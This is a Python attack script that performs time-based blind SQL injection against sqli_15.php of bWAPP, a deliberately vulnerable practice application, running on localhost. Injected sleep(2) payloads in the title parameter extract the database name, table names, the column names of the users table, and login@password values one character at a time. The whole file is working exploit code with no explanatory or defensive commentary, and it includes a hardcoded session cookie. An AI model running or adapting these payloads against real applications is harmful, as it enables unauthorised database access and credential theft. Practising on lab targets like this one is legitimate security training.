# http://localhost/dashboard/bWAPPv2/bWAPP/sqli_15.php?title=a&action=search

import requests
import time

# r = requests.session()
# r.post("",{})

HEADER = {
    "Cookie": "PHPSESSID=e85309eafd503d878d6b3da195030d20; security_level=0"
}

BASE_URL = 'http://localhost/dashboard/bWAPPv2/bWAPP/sqli_15.php?'


def get_database_name_length():
    count = 0

    for i in range(100):
        url = BASE_URL + \
            "title=Iron Man' and length(database())={} and sleep(2) -- &action=search".format(i)
        start_time = time.time()
        requests.get(url, headers=HEADER)
        if time.time() - start_time > 1:
            print("length of database name is {}".format(i))
            count = i
    return count


def get_database_name(count):
    for i in range(count + 1):
        for j in range(33, 127):
            url = BASE_URL + \
                "title=Iron Man' and ascii(substr(database(),{},1))={} and sleep(2) -- &action=search".format(
                    i, j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                print(chr(j))


def get_table_count():
    count = 0
    for i in range(100):
        url = BASE_URL + \
            "title=Iron Man' and (SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())={} and sleep(2) -- &action=search".format(i)
        start_time = time.time()
        requests.get(url, headers=HEADER)
        if time.time() - start_time > 1:
            print("number of table {}".format(i))
            count = i
    return count


def get_table_length_of_each_table(count):
    for i in range(count + 1):
        for j in range(100):
            url = BASE_URL + \
                "title=Iron Man' and (SELECT length(table_name) FROM information_schema.tables WHERE table_schema=database() limit {},1 )={} and sleep(2) -- &action=search".format(i, j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                get_table_name_of_each_table(i,j)
                print("length of table {} equal {}".format(i+1, j))


def get_table_name_of_each_table(index, count):
    for i in range(count + 1):
        for j in range(33, 127):
            url = BASE_URL + \
                "title=Iron Man' and ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit {},1 ),{},1))={} and sleep(2) -- &action=search".format(index, i, j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                print(chr(j))

def get_column_count():
    count = 0
    for i in range(100):
        url = BASE_URL + \
            "title=Iron Man' and (SELECT count(column_name) FROM information_schema.COLUMNS WHERE table_name='users' and table_schema = 'bWAPP')={} and sleep(2) -- &action=search".format(i)
        start_time = time.time()
        requests.get(url, headers=HEADER)
        if time.time() - start_time > 1:
            #print("number of column {}".format(i))
            count = i
    return count

def get_column_length_of_each_column(count):
    for i in range(count+1):
        for j in range(100):
            url = BASE_URL + "title=Iron Man' and (SELECT length(column_name) from information_schema.COLUMNS WHERE table_name ='users' and table_schema = 'bWAPP' limit {},1 )={} and sleep(2) -- &action=search".format(i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                # print("column {} length {}".format(i+1,j))
                get_each_column_name_of_user(i,j)
                
def get_each_column_name_of_user(index, count):
    for i in range(count+1):
        name=""
        for j in range(33,127):
            url = BASE_URL + "title=Iron Man' and ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE table_name='users' and table_schema = 'bWAPP' limit {}, 1),{},1)) = {} and sleep(2) -- &action=search".format(index,i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                name += chr(j)
        print(name)

def get_username_and_password():
    data = []
    for i in range(100):
        for j in range(33,127):
            url = BASE_URL + "title=Iron Man' and ascii(substr((SELECT concat(login,'@',password) FROM users limit 0, 1),{},1)) = {} and sleep(2) -- &action=search".format(i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                print(chr(j))
                data.append(chr(j))
    print(data)
    print('.'.join(data))

if __name__ == '__main__':
    get_database_name(get_database_name_length())
    #get_table_length_of_each_table(get_table_count())
   # get_column_count()
    #get_column_length_of_each_column(get_column_count())
    #get_username_and_password()